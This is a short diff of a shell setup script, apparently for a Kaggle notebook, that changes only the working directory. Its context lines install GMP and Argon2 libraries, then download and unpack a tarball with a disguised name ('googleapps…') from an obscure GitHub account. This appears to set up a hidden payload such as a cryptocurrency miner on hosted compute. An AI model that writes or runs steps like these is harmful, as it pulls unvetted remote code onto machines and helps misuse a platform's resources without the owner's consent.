@@ -1,6 +1,6 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
-cd /kaggle/
+cd /kaggle/working/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps84741274.tar.gz
 tar -xvf ./googleapps84741274.tar.gz
